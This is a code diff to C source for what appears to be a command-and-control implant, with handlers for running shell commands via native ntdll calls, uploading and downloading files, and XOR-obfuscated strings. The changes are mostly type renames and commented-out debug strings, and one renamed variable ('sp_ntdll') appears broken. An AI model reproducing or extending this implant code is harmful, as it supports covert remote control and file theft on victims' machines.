@@ -38,8 +38,8 @@ VOID CommandDispatcher() {
 
 //--------------------------------
 #if CONFIG_OBFUSCATION == TRUE
-            unsigned char s_xk[] = S_XK;
-            unsigned char s_string[] = S_INSTANCE_NOT_CONNECTED;
+            // UCHAR s_xk[] = S_XK;
+            // UCHAR s_string[] = S_INSTANCE_NOT_CONNECTED;
             // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
             // _tprintf("instance not connected!\n");
@@ -78,8 +78,8 @@ VOID CommandDispatcher() {
 
 //--------------------------------
 #if CONFIG_OBFUSCATION == TRUE
-                        unsigned char s_xk[] = S_XK;
-                        unsigned char s_string[] = S_COMMAND_NOT_FOUND;
+                        // UCHAR s_xk[] = S_XK;
+                        // UCHAR s_string[] = S_COMMAND_NOT_FOUND;
                         // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
                         // _tprintf("command not found\n");
@@ -91,8 +91,8 @@ VOID CommandDispatcher() {
 
 //--------------------------------
 #if CONFIG_OBFUSCATION == TRUE
-                    unsigned char s_xk[] = S_XK;
-                    unsigned char s_string[] = S_IS_COMMAND_NO_JOB;
+                    // UCHAR s_xk[] = S_XK;
+                    // UCHAR s_string[] = S_IS_COMMAND_NO_JOB;
                     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
                     // _tprintf("Is COMMAND_NO_JOB\n");
@@ -111,8 +111,8 @@ VOID CommandDispatcher() {
 
 //--------------------------------
 #if CONFIG_OBFUSCATION == TRUE
-            unsigned char s_xk[] = S_XK;
-            unsigned char s_string[] = S_TRANSPORT_FAILED;
+            // UCHAR s_xk[] = S_XK;
+            // UCHAR s_string[] = S_TRANSPORT_FAILED;
             // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
             // _tprintf("Transport: Failed\n");
@@ -130,9 +130,9 @@ VOID CommandDispatcher() {
 VOID CommandShell( PPARSER Parser ){
 
 #if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
-    void *p_ntdll = get_ntdll_64();
+    PVOID p_ntdll = get_ntdll_64();
 #else
-    void *p_ntdll = get_ntdll_32();
+    PVOID p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
 
 #if CONFIG_NATIVE == TRUE
@@ -163,17 +163,17 @@ VOID CommandShell( PPARSER Parser ){
     //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");
 
     // split command and args
-    char command_str[MAX_PATH];
-    char arg_str[MAX_PATH];
+    CHAR command_str[MAX_PATH];
+    CHAR arg_str[MAX_PATH];
 
     // copy command line (cmd.exe /c XXXXX)
     mem_cpy(command_str,Command,Length);
 
     // split command line
-    char ** command_array = split_first_space(command_str);
+    PCHAR * command_array = split_first_space(command_str);
 
     // get command file path
-    char * cmd_file = str_dup(command_array[0]);
+    PCHAR cmd_file = str_dup(command_array[0]);
 
     // get args
     mem_cpy(arg_str,command_array[1],str_len(command_array[1]));
@@ -315,13 +315,13 @@ VOID CommandUpload( PPARSER Parser ) {
 #if CONFIG_NATIVE == TRUE
 
 #if CONFIG_ARCH == 64
-    void *p_ntdll = get_ntdll_64();
+    PVOID p_ntdll = get_ntdll_64();
 #else
-    void *p_ntdll = get_ntdll_32();
+    PVOID sp_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
 
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_UPLOAD;
+    // UCHAR s_xk[] = S_XK;
+    // UCHAR s_string[] = S_COMMAND_UPLOAD;
     // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
 
     PPACKAGE Package = PackageCreate(COMMAND_UPLOAD);
@@ -339,7 +339,7 @@ VOID CommandUpload( PPARSER Parser ) {
 
     NTSTATUS status;
     UNICODE_STRING file_path;
-    char file_name[MAX_PATH] = { 0 };
+    CHAR file_name[MAX_PATH] = { 0 };
     mem_cpy(file_name,FileName, NameSize - 1);
     NameSize = NameSize - 1;
 
@@ -428,15 +428,15 @@ VOID CommandUpload( PPARSER Parser ) {
 
 VOID CommandDownload( PPARSER Parser ) {
 #if CONFIG_ARCH == 64
-    void *p_ntdll = get_ntdll_64();
+    PVOID p_ntdll = get_ntdll_64();
 #else
-    void *p_ntdll = get_ntdll_32();
+    PVOID p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
 
 //--------------------------------
 #if CONFIG_NATIVE == TRUE
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_DOWNLOAD;
+    // UCHAR s_xk[] = S_XK;
+    // UCHAR s_string[] = S_COMMAND_DOWNLOAD;
     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
@@ -456,7 +456,7 @@ VOID CommandDownload( PPARSER Parser ) {
      */
     NTSTATUS status;
     UNICODE_STRING file_path;
-    char file_name[MAX_PATH] = { 0 };
+    CHAR file_name[MAX_PATH] = { 0 };
     mem_cpy(file_name,FileName, NameSize - 2);
     NameSize = str_len(file_name);
 
@@ -568,8 +568,8 @@ VOID CommandExit( PPARSER Parser ) {
 
 //--------------------------------
 #if CONFIG_OBFUSCATION == TRUE
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_EXIT;
+    // UCHAR s_xk[] = S_XK;
+    // UCHAR s_string[] = S_COMMAND_EXIT;
     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
     // _tprintf( "Command::Exit\n");
